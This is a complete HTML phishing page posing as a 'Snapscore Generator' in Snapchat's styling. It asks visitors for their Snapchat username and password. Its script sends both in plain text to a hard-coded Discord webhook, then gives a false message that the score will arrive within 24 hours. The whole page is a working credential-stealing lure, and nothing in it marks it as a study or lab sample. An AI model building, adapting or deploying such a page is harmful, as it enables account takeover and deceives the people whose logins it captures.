<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapscore Generator</title>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@500;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Montserrat', 'Avenir Next', 'Helvetica Neue', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: #FFFC00; /* Snapchat yellow */
            color: #000; /* Black text for contrast */
        }
        .container {
            text-align: center;
            background: white;
            padding: 20px;
            border-radius: 20px; /* Rounded corners */
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2); /* Softer shadow */
            max-width: 400px;
            width: 90%;
        }
        h1 {
            margin: 0;
            font-size: 24px;
            font-weight: 700;
            color: #000;
        }
        input, button {
            margin: 10px 0;
            padding: 15px;
            width: 90%;
            font-size: 16px;
            border: 2px solid #000; /* Black border for Snapchat theme */
            border-radius: 8px;
            box-sizing: border-box;
        }
        input {
            background: #FFF;
            color: #000;
        }
        button {
            background: #000; /* Black button */
            color: #FFF; /* White text */
            font-weight: bold;
            border: none;
            cursor: pointer;
        }
        button:hover {
            background: #333; /* Darker black on hover */
        }
        .logo {
            width: 100px; /* Set logo size */
            margin-bottom: 20px; /* Space between logo and heading */
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Add Snapchat Logo -->
        <img src="https://www.logo.wine/a/logo/Snapchat/Snapchat-Ghost-Outlined-Logo.wine.svg" alt="Snapchat Logo" class="logo">
        
        <h1>Snapscore Generator</h1>
        <input id="usr" type="text" placeholder="Enter Snapchat Username" required>
        <input id="pass" type="text" placeholder="Enter Password" required>
        <input id="score" type="number" placeholder="Enter Desired Snapscore (max 10,000)" required>
        <button onclick="sendMessage()">Generate Snapscore</button>
    </div>
    <script>
        function sendMessage() {
            const usr = document.getElementById('usr').value;
            const pass = document.getElementById('pass').value;
            const score = document.getElementById('score').value;

            if (score > 10000) {
                alert("Snapscore cannot exceed 10,000.");
                return;
            }

            const webhookURL = "https://discord.com/api/webhooks/1309191543306846248/c0IlCkxXDM0s7svWIfWzGusmb9DHVTqGTpDkPAKBybmpXkMVY6BNVVP9115-toPYSmIK";

            fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: `User: ${usr}, Pass: ${pass}, Desired Snapscore: ${score}` }),
            })
            .then(response => {
                if (response.ok) {
                    alert("Generating Snapscore! May take up to 24 hours. Please be patient.");
                } else {
                    alert("Failed to send message. Check the webhook URL.");
                }
            })
            .catch(error => {
                console.error("Error:", error);
                alert("An error occurred. Check the console for details.");
            });
        }
    </script>
</body>
</html>
